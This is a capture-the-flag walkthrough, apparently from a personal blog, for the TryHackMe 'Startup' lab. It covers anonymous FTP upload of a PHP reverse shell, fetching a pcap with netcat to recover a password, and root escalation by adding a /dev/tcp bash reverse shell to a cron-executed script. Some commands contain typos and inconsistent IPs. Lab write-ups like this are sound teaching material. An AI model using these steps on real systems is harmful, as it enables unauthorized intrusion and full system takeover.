---
title: Startup Machine TryHackMe
date: 2022-10-22 00:18:00 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Description

In this machine we will learn how to exploit revere shells on webpages using ftp server to upload files, as well as privelege escalation with cron

# Enumeration

First of all, we have to ping the machine to be sure it is running. We will do this by pinging our target machine using the following command:

```shell
ping -c 1 10.10.249.130
```

(Note we used -c parameter to ping just once, since its enough)

You should get an output like this:

```shell
64 bytes from 10.10.249.130: icmp_seq=3 ttl=63 time=53.7 ms
```
If it doesnt look like these, you should refresh the VPN conection by downloading a new one and restarting the machine

Now, lets run a nmap scan using the following command:

```shell
nmap -p- --open -sS -sVC --min-rate 5000 -n -Pn 10.10.35.127
```
Now lets have a quick look at the results:

```ruby

Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.11.3.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
> As shown, we only have 3 ports opened: 21, 22 and 80 whichs means the only way to exploit this machine is through its webpage
{: .prompt-tip}

# Exploitation 

Now, lets see if we have any information at the target's webpage:

```shell
http://10.10.249.130
```
![Desktop View](/assets/img/page.png){: w="700" h="400" }
Unfortunately, it doest look like we can get any tipe of information from it.

> Maybe running a gobuster deeper scan, we can get something else. 
{: .prompt-tip}

Lets run the command:

```shell
gobuster dir -u 10.10.249.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x.html,.css,.js,.php,.txt -t 128

As  you can see, we used two more parameters:
-x to search for specific file extensions
-t to use more threads, so the research goes faster
```
>If you get an error saying that the directory-list file was not found, please search it on your own system, since the route may change.
{: .prompt-danger}

>Also, if you get of error about header response time out, it is because of the ammount of threads we are using. Since every page is diffent, consider lowering it a litlle bit so you can run the scan until the end.
{: .prompt-danger}

```ruby 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.249.130
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,css,js,php,txt
[+] Timeout:                 10s
===============================================================
2022/10/22 00:51:15 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 808]
/files                (Status: 301) [Size: 314] [--> http://10.10.249.130/files/]
/server-status        (Status: 403) [Size: 278]                                  
                                                                                 
===============================================================
2022/10/22 01:02:56 Finished
===============================================================
```
>Be careful with the server status error code returned, since there is no need to dive into paths with Status 400, like /server-status in this case.
{: .prompt-warning}

We will now just go straight to /files:

```shell

http://10.10.249/files
```
![Desktop View](/assets/img/files.png){: w="700" h="400" }

We can see an ftp folder, so lets dive into it and try to upload a php reverse shell to get a reverse shell.

# FTP & Reverse shell

First of all, lets get a ftp connection to the target with the following command:

```shell
ftp 10.10.249.130
```
And type "anonymous" as the Name. When asked for a password just press enter. Now you should be seeing this:

```shell
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
lets do a quick ls to see what we can get.

```shell
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
```
lets just download the notice.txt file to our local machine by typing:

```shell
get notice.txt
```
>When you run the "get" command, the file will be downloaded the to path you were before running the "ftp" command.
{: .prompt-warning}

Lets see what it says

```shell
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents 
from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Seems like we got an username: Maya, but for the moment we can't use it no where, so lets proceed to inyect the reverse shell

We will use the a python reverse shell script, which is locate in /share/webshells/php, by uploading it to the webpage
using the ftp server.

>Make sure to cd into /ftp folder inside the ftp server, otherwise you wont be able to upload the file
{: .prompt-info}

>Before uploading it, we need to change some of its settings first:
{: .prompt-warning}

Open the file and search for:

```shell
$ip = {Set the IP you will get the reverse shell to. In this case, THM's VPN}
$port {the port you will later conect the netcat to}

I will use port 1234
```

```ruby
ftp> put php-reverse-shell.php
local: web-script.php remote: web-script.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5522 bytes sent in 0.00 secs (89.2574 MB/s)
ftp> 
```
Now, lets set netcat to listen on the port we previosuly set (1234):

```shell
sudo nc -lvn 1234
listening on [any] 1234 ....
```
Its time to run the script:

```shell
http://10.10.249.130/files/ftp/php-reserse-shell.php
```
If you done it correctly, now you should have the reverse shell setted:

```ruby
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:20:19 up  1:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
>If we run a ls -la we will see a .txt file, which will give us the answer to the first question of the room
{: .prompt-tip}

Looking through, we found a user called "lennie" in the /home directory, which can be used to stablish a ssh connection.
Unfortunately, we dont have the password. So lets keep looking:

If we check the root directory again, we can see that as www-data user we have access to a file called "incidents", whichis a wireshark file. Lets download get in into our local machine with the following command:

```shell
nc -lvpn 1234 > suspicious.pcapng {In our local machine}
nc {Our VPN IP} 1234 suspicious.pcapng

(Note we are using port 1234, which is the one we setted up in the php file)
```
Now that we got it inside our local machine, lets read it with the following command:

```shell
ettercap -T -r suspicious.pcapng
```

Looking closely, we can find a password:

```shell
Fri Oct  2 19:41:45 2020 [70752]
TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (19)
c4ntg3t3n0ughsp1c3
```

Lets use it to get into lennie's ssh we mentioned before:

NICE! It worked.

>Now if we read the user.txt file, we will be able to get the user flag
{: .prompt-tip}

Now lets try to scale priveleges to get the root.txt flag

Diving into the scripts directory, we can appreciate a planner.sh file. Lets give it a look:

```ruby
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
As we can see, its a Cron executable, which takes the input from print.sh (which can be edite by lennie), so we can write a reverse shell command inside it go gain access to root.

Lets just cd /etc directory and nano print.sh and add the following command:

>Before we run the command, we must open a netcat on a desired port. I will use the port 6666
```shell
bash -i >& /dev/tcp/{VPN IP}/6666 0>&1 
```

If yo done it correctly, you are now root using a reverse shell

```ruby
listening on [any] 6666 ...
connect to [10.11.3.250] from (UNKNOWN) [10.10.249.130] 42518
bash: cannot set terminal process group (2773): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
```
>Now you can submit the root flag! CONGRATULATIONS!!
{: .prompt-tip}
